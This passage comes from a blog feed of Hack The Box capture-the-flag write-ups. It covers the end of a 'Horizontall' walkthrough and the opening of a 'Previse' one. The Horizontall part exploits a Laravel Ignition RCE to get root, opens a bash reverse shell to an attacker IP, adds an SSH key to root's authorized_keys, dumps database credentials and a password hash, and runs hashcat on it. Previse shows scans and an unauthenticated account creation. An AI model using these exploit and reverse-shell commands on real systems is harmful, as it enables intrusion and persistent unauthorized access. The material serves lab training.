</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/ambionics/phpggc.git
git clone https://github.com/ambionics/laravel-exploits
<span style="color:#8be9fd;font-style:italic">cd</span> ./laravel-exploits
nvim laravel-ignition-rce.py
ln -s ../phpggc/phpggc
php -d<span style="color:#f1fa8c">&#39;phar.readonly=0&#39;</span> ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system <span style="color:#f1fa8c">&#39;id&#39;</span>
./laravel-ignition-rce.py http://localhost:8000/ /tmp/exploit.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>
--------------------------
+ Logs cleared
</code></pre></td></tr></table>
</div>
</div><p>The above PoC worked and found successfully the log files. We can now get the root flag:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">php -d<span style="color:#f1fa8c">&#39;phar.readonly=0&#39;</span> ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system <span style="color:#f1fa8c">&#39;cat /root/root.txt&#39;</span>
./laravel-ignition-rce.py http://localhost:8000/ /tmp/exploit.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
97675375c79e2dfe5b9c8af58d1677a6
--------------------------
+ Logs cleared
</code></pre></td></tr></table>
</div>
</div><p>With the right log path, the searchsploit python script works:</p>
<pre><code>python3 /home/ctf/49424.py http://localhost:8000 /home/developer/myproject/storage/logs/laravel.log 'id'
Exploit...
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>And we can get a reverse shell:</p>
<pre><code>python3 /home/ctf/49424.py http://localhost:8000 /home/developer/myproject/storage/logs/laravel.log 'bash -c &quot;bash -i &amp;&gt; /dev/tcp/10.10.14.51/9000 0&gt;&amp;1&quot;'
Exploit...
──────────────────────────────────────────────────────────────────────────
nc -lnvp 9000
Listening on 0.0.0.0 9000
Connection received on 172.19.0.1 64954
root@horizontall:/home/developer/myproject/public# id
uid=0(root) gid=0(root) groups=0(root)
root@horizontall:/home/developer/myproject/public# cd
root@horizontall:~# ls -la
drwx------  7 root root  4096 Oct 20 04:45 .
drwxr-xr-x 24 root root  4096 Aug 23 11:29 ..
lrwxrwxrwx  1 root root     9 Aug  2 12:05 .bash_history -&gt; /dev/null
-rw-r--r--  1 root root  3145 Jun  1 12:54 .bashrc
-rwxr-xr-x  1 root root   185 May 28 23:47 boot.sh
drwx------  2 root root  4096 Jun  3 02:07 .cache
drwx------  3 root root  4096 Jun  3 02:07 .gnupg
drwxr-xr-x  3 root root  4096 May 25 19:26 .local
-rw-------  1 root root   550 Aug  2 17:34 .mysql_history
-rw-r--r--  1 root root    12 Oct 20 04:45 pid
drwxr-xr-x  5 root root  4096 Jul 29 04:41 .pm2
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root   384 Jul 29 04:51 restart.sh
-r--------  1 root root    33 Oct 19 14:47 root.txt
drwx------  2 root root  4096 May 25 11:43 .ssh
-rw-rw-rw-  1 root root 12069 Aug  3 21:54 .viminfo
root@horizontall:~# cd .ssh
cd .ssh
root@horizontall:~/.ssh#
</code></pre>
<p>Persistence on root SSH and cerificate authentication</p>
<pre><code>php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system 'bash -c &quot;bash -i &amp;&gt; /dev/tcp/10.10.14.51/9000 0&gt;&amp;1&quot;'
./laravel-ignition-rce.py http://localhost:8000/ /tmp/exploit.phar
──────────────────────────────────────────────────────────────────────────
nc -lnvp 9000
Listening on 0.0.0.0 9000
Connection received on 172.19.0.1 65290
root@horizontall:/home/developer/myproject/public# cd ~/.ssh
root@horizontall:~/.ssh# ls -l
-rw------- 1 root root 0 May 25 11:43 authorized_keys
root@horizontall:/home/developer/myproject/public# echo &quot;ssh-rsa AAAAB3Nz[..]&quot; &gt;&gt; ~/.ssh/authorized_keys
$ ssh -i ~/.ssh/id_rsa_horizontall.htb root@horizontall.htb
root@horizontall:~#
</code></pre>
<h2 id="other-possible-exploitation-path">Other possible exploitation path</h2>
<h3 id="explore">Explore</h3>
<p>Upload linpeas</p>
<pre><code>python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.19.0.1 - - [20/Oct/2021 10:36:06] &quot;GET /linpeas.sh.gz HTTP/1.1&quot; 200 -
────────────────────────────────────────────────────────────────────────────
strapi@horizontall:/dev/shm$ wget http://10.10.14.51/linpeas.sh.gz
strapi@horizontall:/dev/shm$ gunzip linpeas.sh.gz
strapi@horizontall:/dev/shm$ chmod a+x linpeas.sh
strapi@horizontall:/dev/shm$ ./linpeas.sh
</code></pre>
<p>Found Mysql credentials:</p>
<pre><code>strapi@horizontall:~/myapi/config$ grep -Ri mysql *
grep -Ri mysql *
environments/production/database.json:        &quot;client&quot;: &quot;mysql&quot;,
environments/development/database.json:        &quot;client&quot;: &quot;mysql&quot;,
environments/staging/database.json:        &quot;client&quot;: &quot;mysql&quot;,
strapi@horizontall:~/myapi/config/environments$ cat {development,staging,production}/database.json | egrep &quot;username|password&quot;
    &quot;username&quot;: &quot;developer&quot;,
    &quot;password&quot;: &quot;#J!:F9Zt2u&quot;
strapi@horizontall:~/myapi/config/environments$ cat development/database.json
{
  &quot;defaultConnection&quot;: &quot;default&quot;,
  &quot;connections&quot;: {
    &quot;default&quot;: {
      &quot;connector&quot;: &quot;strapi-hook-bookshelf&quot;,
      &quot;settings&quot;: {
        &quot;client&quot;: &quot;mysql&quot;,
        &quot;database&quot;: &quot;strapi&quot;,
        &quot;host&quot;: &quot;127.0.0.1&quot;,
        &quot;port&quot;: 3306,
        &quot;username&quot;: &quot;developer&quot;,
        &quot;password&quot;: &quot;#J!:F9Zt2u&quot;
      },
      &quot;options&quot;: {}
    }
  }
}
</code></pre>
<p>The shell has to be upgraded otherwise we fail to obtain a mysql shell after login. We can then find some password hashes:</p>
<pre><code>strapi@horizontall:~/myapi$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
strapi@horizontall:~/myapi$ mysql -u developer -h localhost -P 3306 -D strapi -p
Enter password: #J!:F9Zt2u
[..]
mysql&gt; show tables;
show tables;
+------------------------------+
| Tables_in_strapi             |
+------------------------------+
| core_store                   |
| reviews                      |
| strapi_administrator         |
| upload_file                  |
| upload_file_morph            |
| users-permissions_permission |
| users-permissions_role       |
| users-permissions_user       |
+------------------------------+
8 rows in set (0.00 sec)

mysql&gt; describe strapi_administrator;
describe strapi_administrator;
+--------------------+--------------+------+-----+---------+----------------+
| Field              | Type         | Null | Key | Default | Extra          |
+--------------------+--------------+------+-----+---------+----------------+
| id                 | int(11)      | NO   | PRI | NULL    | auto_increment |
| username           | varchar(255) | NO   | MUL | NULL    |                |
| email              | varchar(255) | NO   |     | NULL    |                |
| password           | varchar(255) | NO   |     | NULL    |                |
| resetPasswordToken | varchar(255) | YES  |     | NULL    |                |
| blocked            | tinyint(1)   | YES  |     | NULL    |                |
+--------------------+--------------+------+-----+---------+----------------+
6 rows in set (0.00 sec)

mysql&gt; select id, username, password from strapi_administrator;
select id, username, password from strapi_administrator;
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
+----+----------+--------------------------------------------------------------+
|  3 | admin    | $2a$10$wH/hxNBgrNRZnNRdcyuDzepktwWu6A/VtmXN1IQBIIGzJpGRSodGG |
+----+----------+--------------------------------------------------------------+
1 row in set (0.00 sec)
</code></pre>
<p>I learnt from past experience that I should not trust copy-pasting hashes, so I&rsquo;ll use TO_BASE64:</p>
<pre><code>mysql&gt; select to_base64(password) from strapi_administrator;
select to_base64(password) from strapi_administrator;
+-----------------------------------------------------------------------------------+
| to_base64(password)                                                               |
+-----------------------------------------------------------------------------------+
| JDJhJDEwJHdIL2h4TkJnck5SWm5OUmRjeXVEemVwa3R3V3U2QS9WdG1YTjFJUUJJSUd6SnBHUlNvZEdH  |
+-----------------------------------------------------------------------------------+
</code></pre>
<h3 id="cracking-the-hash-will-take-too-long">cracking the hash will take too long</h3>
<p>As I don&rsquo;t have a GPU and considering the uncertainty of using the right dictionary of bruteforcing attack, this is not an effort I want to spend right now</p>
<pre><code>$ echo JDJhJDEwJHdIL2h4TkJnck5SWm5OUmRjeXVEemVwa3R3V3U2QS9WdG1YTjFJUUJJSUd6SnBHUlNvZEdH | base64 -d | hashid -m
Analyzing '$2a$10$wH/hxNBgrNRZnNRdcyuDzepktwWu6A/VtmXN1IQBIIGzJpGRSodGG'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x
[+] bcrypt [Hashcat Mode: 3200]

$ echo JDJhJDEwJHdIL2h4TkJnck5SWm5OUmRjeXVEemVwa3R3V3U2QS9WdG1YTjFJUUJJSUd6SnBHUlNvZEdH | base64 -d &gt; hashes.txt
$ hashcat -m 3200 ./hashes.txt /opt/dictionaries/rockyou.txt --force
[..]
Session..........: hashcat
Status...........: Running
Hash.Type........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2a$10$wH/hxNBgrNRZnNRdcyuDzepktwWu6A/VtmXN1IQBIIGz...RSodGG
Time.Started.....: Wed Oct 20 11:16:28 2021 (13 mins, 49 secs)
Time.Estimated...: Sun Oct 24 04:43:02 2021 (3 days, 17 hours)
</code></pre>
]]></content></item><item><title>HTB - Previse</title><link>https://0xade1.github.io/posts/2021/10/htb-previse/</link><pubDate>Sun, 17 Oct 2021 15:19:38 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/htb-previse/</guid><description>Exploration $ rustscan -a 10.10.11.104 -- -A -sCV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4= | 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps 80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.</description><content type="html"><![CDATA[<h2 id="exploration">Exploration</h2>
<pre><code>$ rustscan -a 10.10.11.104 -- -A -sCV
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=
|   256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
8080/tcp open  mysql   syn-ack MySQL 5.7.35-0ubuntu0.18.04.1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.35-0ubuntu0.18.04.1
|   Thread ID: 34
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, SwitchToSSLAfterHandshake, SupportsCompression, ODBCClient, SupportsTransactions, LongColumnFlag, FoundRows, IgnoreSigpipes, LongPassword, Speaks41ProtocolOld, InteractiveClient, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: ey55x%%@j\x0B\x0F\x0C7n\\x1DV\x19j4
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>Web enumeration:</p>
<pre><code>gobuster dir -u http://10.10.11.104 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php -s 200,302
[..]
/logout.php (Status: 302)
/login.php (Status: 200)
/download.php (Status: 302)
/logs.php (Status: 302)
/files.php (Status: 302)
/config.php (Status: 200)
/index.php (Status: 302)
/accounts.php (Status: 302)
/nav.php (Status: 200)
/header.php (Status: 200)
/footer.php (Status: 200)
/status.php (Status: 302)
</code></pre>
<p>going to nav.php, we discover few more pages including <strong>accounts.php</strong> , here it is best to use curl or burp because the browser is redirecting to index.php so we may overlook the form for accounts.php:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">    &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-container&#34;</span>&gt;
        &lt;<span style="color:#ff79c6">h2</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-heading-divider&#34;</span>&gt;Add New Account&lt;/<span style="color:#ff79c6">h2</span>&gt;
        &lt;<span style="color:#ff79c6">p</span>&gt;Create new user.&lt;/<span style="color:#ff79c6">p</span>&gt;
        &lt;<span style="color:#ff79c6">p</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-alert-danger&#34;</span>&gt;ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!&lt;/<span style="color:#ff79c6">p</span>&gt;
        &lt;<span style="color:#ff79c6">p</span>&gt;Usernames and passwords must be between 5 and 32 characters!&lt;/<span style="color:#ff79c6">p</span>&gt;
    &lt;/<span style="color:#ff79c6">p</span>&gt;
        &lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">role</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;form&#34;</span> <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;accounts.php&#34;</span>&gt;
            &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-margin&#34;</span>&gt;
                &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-inline&#34;</span>&gt;
                    &lt;<span style="color:#ff79c6">span</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-form-icon&#34;</span> <span style="color:#50fa7b">uk-icon</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;icon: user&#34;</span>&gt;&lt;/<span style="color:#ff79c6">span</span>&gt;
                    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-input&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">placeholder</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Username&#34;</span>&gt;
                &lt;/<span style="color:#ff79c6">div</span>&gt;
            &lt;/<span style="color:#ff79c6">div</span>&gt;
            &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-margin&#34;</span>&gt;
                &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-inline&#34;</span>&gt;
                    &lt;<span style="color:#ff79c6">span</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-form-icon&#34;</span> <span style="color:#50fa7b">uk-icon</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;icon: lock&#34;</span>&gt;&lt;/<span style="color:#ff79c6">span</span>&gt;
                    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-input&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">placeholder</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Password&#34;</span>&gt;
                &lt;/<span style="color:#ff79c6">div</span>&gt;
            &lt;/<span style="color:#ff79c6">div</span>&gt;
            &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-margin&#34;</span>&gt;
                &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-inline&#34;</span>&gt;
                    &lt;<span style="color:#ff79c6">span</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-form-icon&#34;</span> <span style="color:#50fa7b">uk-icon</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;icon: lock&#34;</span>&gt;&lt;/<span style="color:#ff79c6">span</span>&gt;
                    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;confirm&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-input&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;confirm&#34;</span> <span style="color:#50fa7b">placeholder</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Confirm Password&#34;</span>&gt;
                &lt;/<span style="color:#ff79c6">div</span>&gt;
            &lt;/<span style="color:#ff79c6">div</span>&gt;
            &lt;<span style="color:#ff79c6">button</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-button uk-button-default&#34;</span>&gt;CREATE USER&lt;/<span style="color:#ff79c6">button</span>&gt;
        &lt;/<span style="color:#ff79c6">form</span>&gt;
    &lt;/<span style="color:#ff79c6">div</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>In Burp, we create a user, and we see in the response: <strong>Success! User was added!</strong> :</p>
<pre><code>POST /accounts.php HTTP/1.1
Host: 10.10.11.104
[..]
Content-Type: application/x-www-form-urlencoded
username=0xcvb&amp;password=0xcvb&amp;confirm=0xcvb
</code></pre>
<p>Once we have logged in the application, I can download:</p>
<ul>
<li>SITEBACKUP.zip</li>
<li>applications logs out.log</li>
</ul>
<p>The logs are a combination of username and fileID:</p>
<pre tabindex="0"><code class="language-csv" data-lang="csv">time,user,fileID
1622486221,m4lwhere,1
1622482496,m4lwhere,4
1622678056,m4lwhere,5
1622678059,m4lwhere,6
1622715842,m4lwhere,23
1622715674,m4lwhere,24
1623200269,m4lwhere,25
1623236571,m4lwhere,26
1623978778,m4lwhere,32
1634458635,burt_macklin,32
</code></pre><p>The zip files contains the website source code:</p>
<pre><code>unzip siteBackup.zip
Archive:  siteBackup.zip
  inflating: accounts.php
  inflating: config.php
  inflating: download.php
  inflating: file_logs.php
  inflating: files.php
  inflating: footer.php
  inflating: header.php
  inflating: index.php
  inflating: login.php
  inflating: logout.php
  inflating: logs.php
  inflating: nav.php
  inflating: status.php
</code></pre>
<p>We can find the mysql password but this is a diversion as I was not able to remotely login:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
